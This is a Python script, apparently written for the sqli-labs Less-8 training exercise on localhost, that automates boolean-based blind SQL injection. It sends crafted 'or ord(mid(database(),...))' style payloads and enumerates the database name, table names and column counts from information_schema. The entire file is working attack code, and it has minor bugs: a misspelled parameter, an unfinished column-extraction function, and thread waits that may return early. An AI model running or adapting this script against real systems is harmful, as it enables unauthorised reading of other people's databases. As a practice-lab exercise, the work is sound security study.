import requests
import _thread
from concurrent.futures import ThreadPoolExecutor,wait, FIRST_COMPLETED, ALL_COMPLETED
import threading

def get_dbs_len(url,args,value,payload,sucees_tag):
    url_end=""
    dbs_len=0
    for i in range(30):
        #print(str(i))
        url_end=url+args+value+payload+str(i)+"%23"
        #print(url_end)
        r=requests.get(url_end)
        #print(len(r.text))
        if sucess_tag in r.text:
            dbs_len=i
            #print("dbs\'s length is "+str(i))
            break
    return dbs_len

def get_dbs_name(url,args,value,payload,sucess_tag):
    dbs_name=""
    pos = 0  # 截断位置
    url_end=""
    for i in range(dbs_len+1):
        pos=i+1
        #print(str(pos))
        for i in range(127):
            url_end=url+args+value+"or ord(mid(database(),"+str(pos)+",1)) ="+str(i+1)+"%23"
            #print(url_end)
            r=requests.get(url_end)
            #print(len(r.text))
            if sucess_tag in r.text:
                dbs_name+=chr(i+1)
                break
    return dbs_name

def get_tables_sum(url,args,value,payload,sucess_tag):
    table_sum=0
    for i in range(50):
        url_end=url+args+value+payload+str(i)+"%23"
        #print(url_end)
        r=requests.get(url_end)
        if sucess_tag in r.text:
            table_sum=i
            break
    return table_sum

def get_tables_name_len(url,args,value,payload,sucess_tag,tables_sum):

    def get_len(table_order):
        for j in range(30):
            url_end=url+args+value + "or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit "+str(table_order)+",1 )= "+str(j)+"%23"
            #print(url_end)
            r=requests.get(url_end)
            if sucess_tag in r.text:
                tables_len[table_order]=j
                return 0
    table_len=0
    tables_len=[table_len]*tables_sum
    url_end=""
    with ThreadPoolExecutor(max_workers=tables_sum) as t:
        all_task = [t.submit(get_len, order) for order in range(tables_sum)]
        wait(all_task, return_when=ALL_COMPLETED)
        print('finished')
    return tables_len

def get_tables_name(url, args, value, payload, sucess_tag, tables_name_len):
    def get_name(order):
        table_name_tmp = ""
        for i in range(tables_name_len[order]):
            for j in range(127):
                url_end = url + args + value + " or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit " + str(order) + ",1)," + str(
                    i + 1) + ",1)   = \'" + chr(j) + "\' %23"
                #print(url_end)
                r = requests.get(url_end)
                if sucess_tag in r.text:
                    #print(chr(j))
                    table_name_tmp = table_name_tmp + chr(j)
                    break
        tables_name[order] = table_name_tmp


    url_end = ""
    table_name = ""
    tables_name = [table_name] * len(tables_name_len)

    with ThreadPoolExecutor(max_workers=len(tables_name_len)) as t:
        all_task = [t.submit(get_name, order) for order in range(len(tables_name_len))]
        wait(all_task, return_when=FIRST_COMPLETED)
        print('finished')
    return tables_name

def get_table_columns_sum(url,args,value,payload,sucess_tag,tables_name):
    def get_columns_sum(order):
        for i in range(30):
            url_end=url+args+value+"or  (select count(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=\'"+tables_name[order]+"\' ) ="+str(i)+" %23"
            #print(url_end)
            r=requests.get(url_end)
            if sucess_tag in r.text:
                tables_columns_sum[order]=i
                break
    column_sum=0
    tables_columns_sum = [column_sum] * len(tables_name)

    with ThreadPoolExecutor(max_workers=len(tables_name)) as t:
        all_task = [t.submit(get_columns_sum, order) for order in range(len(tables_name))]
        wait(all_task, return_when=FIRST_COMPLETED)
        print('finished')
    return tables_columns_sum

def get_columns_name(url,args,value,payload,sucess_tag,table_name,columns_sum):
    print("loading")
    #待续

url="http://127.0.0.1/sqli-labs/Less-8/?"
args="id="
value="-1\'"

payload=""
payload_getlen="or Length(database()) ="
payload_getname="or ord(mid(database(),1,1)) ='ascill值'"
payload_get_table_sum=" or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() )= "
payload_get_tables_name_len="or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1 )= (猜测得长度)#"
sucess_tag="You are in" #成功的返回标志

dbs_len=0
dbs_name=""

dbs_len=get_dbs_len(url,args,value,payload_getlen,sucess_tag)
dbs_name=get_dbs_name(url,args,value,payload_getname,sucess_tag)
tables_sum=get_tables_sum(url,args,value,payload_get_table_sum,sucess_tag)
tables_name_len=get_tables_name_len(url,args,value,payload_get_tables_name_len,sucess_tag,tables_sum)
tables_name=get_tables_name(url,args,value,payload,sucess_tag,tables_name_len)
tables_columns_sum=get_table_columns_sum(url,args,value,payload,sucess_tag,tables_name)

print("dbs\' len:"+str(dbs_len))
print("dbs\'s name:"+dbs_name)
print("dbs\'s table sum:"+str(tables_sum))
print("dbs\'s  table name len:"+str(tables_name_len))
print("dbs\'s tables name:"+str(tables_name))
print("dbs\'s tables columns sum:"+str(tables_columns_sum))


